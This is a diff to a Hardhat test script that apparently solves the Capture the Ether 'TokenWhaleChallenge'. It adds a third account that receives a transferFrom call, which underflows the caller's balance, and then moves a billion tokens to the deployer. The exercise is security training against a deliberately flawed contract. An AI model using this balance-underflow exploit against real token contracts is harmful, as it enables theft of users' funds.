@@ -7,10 +7,11 @@ import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
 let contract: Contract;
 let deployer : SignerWithAddress
 let receiver : SignerWithAddress
+let spender : SignerWithAddress
 
 before(async () => {
     const accounts = await ethers.getSigners();
-    [deployer,receiver] = accounts;
+    [deployer,receiver,spender] = accounts;
     const challengeFactory = await ethers.getContractFactory("TokenWhaleChallenge")
     const network = await (await ethers.provider.getNetwork()).name
     if (network === "ropsten") {
@@ -29,27 +30,35 @@ it("solves the challenge", async function () {
     expect(approveTxHash).to.not.be.undefined
 
     const checkApprovalTx = await contract.allowance(deployer.getAddress(),receiver.getAddress())
-    console.log(checkApprovalTx.toString())
+    console.log("approval: " + checkApprovalTx.toString())
 
     console.log("deployer " + await deployer.getAddress())
     console.log("receiver " + await receiver.getAddress())
+    console.log("spender " + await spender.getAddress())
     contract = await contract.connect(receiver)
     console.log("signer " +  await contract.signer.getAddress())
     
-    const transferTx = await contract.transferFrom(deployer.getAddress(), receiver.getAddress(), 1)
+    const transferTx = await contract.transferFrom(deployer.getAddress(), spender.getAddress(), 1)
     const transferTxHash = transferTx && transferTx.hash
     expect(transferTxHash).to.not.be.undefined
 
-    const balanceTx = await contract.balanceOf(receiver.getAddress())
-    console.log(balanceTx.toString())
+    const balanceSpenderTx = await contract.balanceOf(spender.getAddress())
+    console.log("balance spender: " + balanceSpenderTx.toString())
+    const balanceReceiverTx = await contract.balanceOf(receiver.getAddress())
+    console.log("balance receiver: " + balanceReceiverTx.toString())
     const balanceDeployerTx = await contract.balanceOf(deployer.getAddress())
-    console.log(balanceDeployerTx.toString())
+    console.log("balance deployer: " + balanceDeployerTx.toString())
 
     // const buyTx = await contract.buy(tokens, {
     //     value: eth,
     // });
     // const buyTxHash = buyTx && buyTx.hash
     // expect(buyTxHash).to.not.be.undefined
+
+    const transferToDeployerTx = await contract.transfer(deployer.getAddress(), 1000000000)
+    const transferToDeployerTxHash = transferToDeployerTx && transferToDeployerTx.hash
+    expect(transferToDeployerTxHash).to.not.be.undefined
+
 
 
     const isComplete = await contract.isComplete()
